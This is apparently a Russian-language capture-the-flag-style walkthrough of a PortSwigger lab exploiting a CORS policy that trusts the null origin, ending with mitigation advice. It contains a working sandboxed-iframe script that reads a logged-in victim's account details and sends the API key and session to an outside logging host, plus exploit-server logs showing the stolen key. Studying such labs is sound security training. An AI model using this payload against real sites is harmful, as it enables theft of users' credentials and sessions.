 когда сайт разрешает пересылку на сайты через белый список - но плохо проверяет субдомены - то это дело можно обойти
примеры:

например, предположим, что приложение предоставляет доступ ко всем доменам, заканчивающимся на:

`normal-website.com`

залоумышленник может получить доступ, зарегистрировав домен:

`hackersnormal-website.com`

в качестве альтернативы, предположим, что приложение предоставляет доступ ко всем доменам, начиная с

`normal-website.com`

злоумышленник может получить доступ, используя домен:

`normal-website.com.evil-user.net`

то есть можно как субдомен пропихнуть любой сайт!!

----

###### Origin: null

пример с null

запрос
```http
GET /sensitive-victim-data Host: vulnerable-website.com Origin: null
```
ответ
```http
HTTP/1.1 200 OK Access-Control-Allow-Origin: null Access-Control-Allow-Credentials: true
```

если такое происходит - то  возможно  получиться сделать перекрестные запросы
и например вот так через iframe sandbox можно угнать данные 
```js
<iframe sandbox="

allow-scripts 
allow-top-navigation 
allow-forms" src="data:text/html,

<script> 
var req = new XMLHttpRequest(); 

req.onload = reqListener; 
req.open('get','vulnerable-website.com/sensitive-victim-data',true);

 req.withCredentials = true; req.send(); 
 
 function reqListener() { 
 
 location='malicious-website.com/log?key='+this.responseText; }; 
 
 </script>"></iframe>
```

-------

#### лаба https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack
##### # Уязвимость CORS с доверенным NULL источником
сайт доверяет "нулевому" источнику
нужно создать скрипт который тырить АПИ ключ при переходе по ссылке на мой сайт

----

есть такой запрос - на получение данных (при условии что юзер авторизован)
```http
GET /accountDetails HTTP/2
Host: 0a0e006803ea5055808c03b700190043.web-security-academy.net
Cookie: session=qgf0wSNr8odbDQmnbMVLjHtdYcwqCTwh
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a0e006803ea5055808c03b700190043.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

```
вот ответ
```http
HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "QTnO1bKCczpQlXLv6chdypcWibJ3b3Pa",
  "sessions": [
    "qgf0wSNr8odbDQmnbMVLjHtdYcwqCTwh"
  ]
}
```

есть заголовок 
`Access-Control-Allow-Credentials: true`
что намекает на то - что CORS разрешает пересылку данных по запросу с других сайтов, но вот с каких - пока что вопрос

--------
проверю через добавление Origin

отправил
`Origin: veveiviivwbrveburvbiervbe.com`
ответ 
```http
HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149
```
в ответе не отразился мой произвольный сайт
но так как есть `Access-Control-Allow-Credentials: true` - значит и есть домен который разрешен!
нужно прошарить карту сайта


-------

я отправил
`Origin: null`
ответ
```http
HTTP/2 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "QTnO1bKCczpQlXLv6chdypcWibJ3b3Pa",
  "sessions": [
    "v1HTXGmdyusafZy6vctW4SZs3RUt19I8"
  ]
}
```
ответ отразился  вот так: `Access-Control-Allow-Origin: null`

-------

### Что такое null origin?

браузер отправляет Origin: null в нескольких случаях 

- Когда запрос идёт из iframe с песочницей (sandbox)
- Из data: URL
- Из файла на диске (file://)

------

### Почему это опасно?

если сервер доверяет null, то атакующий может:

1. Создать страницу с iframe в песочнице 
2. В этом iframe origin будет null
3. Браузер сделает запрос к уязвимому сайту с Origin: null
4. Сервер увидит null и разрешит доступ
5. Данные утекут

------

беру скрипт образцовый и модифицирую его под себя:

```js
<iframe sandbox="

allow-scripts 
allow-top-navigation 
allow-forms" src="data:text/html,

<script> 
var req = new XMLHttpRequest(); 

req.onload = reqListener; 
req.open('get','https://0a0e006803ea5055808c03b700190043.web-security-academy.net/accountDetails');

 req.withCredentials = true; req.send(); 
 
 function reqListener() { 
 
 location='https://exploit-0a1e004c03465022805d02c10164007e.exploit-server.net/exploit/log?key='+this.responseText; }; 
 
 </script>"></iframe>
```

сандБокс - обычно делают для защиты от скриптов, но если пропускается Null - то через этот самый sundBox можно скрипт выполнить (парадокс)

sandbox — это режим изоляции для iframe
когда вставляешь чужой сайт через iframe, sandbox не даёт ему делать хренову кучу опасных вещей: запускать скрипты, отправлять формы, открывать попапы, читать куки, лезть в родительский DOM и так далее 

если sandbox стоит без параметров (пустой), то заблокировано всё!

Но если хочешь что-то разрешить, то добавляешь флаги:
`allow-scripts`, `allow-forms`, `allow-same-origin`
что как раз и видно в запросе нашем оригинальном:
`Sec-Fetch-Site: same-origin`

ЕСЛИ разработчик затупил и доверился null, тот же sandbox становится идеальным способом обойти CORS и украсть данные

создаёш iframe с `sandbox="allow-scripts allow-forms"`, грузим туда data:html с нашим скриптом. origin этого iframe становится null
и сервер видит null, думает "свой", отдаёт данные, браузер послушно разрешает чтение

--------

пробую отправить жертву на мой сайт с этим скриптом / либо самому на сеье проверить

отлино! работает - проверил на себе! все четко - данные мои ушли на мой сервер!

теперь это же жертве отправил 
прошли логи
```c
45.67.139.104   2026-03-06 12:59:44 +0000 "GET /deliver-to-victim HTTP/1.1" 302 "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"

10.0.3.80       2026-03-06 12:59:44 +0000 "GET /exploit/ HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

10.0.3.80       2026-03-06 12:59:44 +0000 "GET /exploit/log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22Im1ukW504ZasTGvjmRseRFF4669YjgjT%22,%20%20%22sessions%22:%20[%20%20%20%20%227qrqsRLc5cwQA2I9yRWhlGD4z0NnRD7x%22%20%20]} HTTP/1.1"

 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

```
сейчас раскодирую url

```c
GET /exploit/log?key={ 
 "username": "administrator",  
 "email": "",  
 "apikey": "Im1ukW504ZasTGvjmRseRFF4669YjgjT",  
 "sessions": [    "7qrqsRLc5cwQA2I9yRWhlGD4z0NnRD7x"  ]} 
 HTTP/1.1"
```
получилось!
вот апи ключ что требуется! Im1ukW504ZasTGvjmRseRFF4669YjgjT

-----
 лаба решена!!

## вывод

я отправил запрос с `Origin null` и увидел что сервер возвращает Access-Control-Allow-Origin null и разрешает куки это значило что сервер доверяет null источнику

`null origin` может быть только в особых случаях например из iframe с песочницей или из data url

я создал iframe с sandbox атрибутами внутри него через data text html загрузил свой скрипт который делает запрос к эндпоинту accountDetails с куками

так как iframe в песочнице его origin стал null и сервер разрешил запрос

когда браузер получил ответ я через location отправил данные на свой эксплойт сервер где они появились в логах

в логах я увидел api ключ администратора и вставил его в решение


почему получилось взломать  ?

разработчик добавил null в белый список доверенных источников, вероятно для удобства тестирования но забыл что null можно подделать через sandbox iframe

#### как защититься  

никогда не добавлять null в список разрешенных origin  ё

если нужно поддерживать локальные файлы или data url использовать другие механизмы  

всегда проверять что белый список содержит только конкретные домены без исключений  

использовать sameSite куки чтобы ограничить отправку с кросс сайтовых запросов



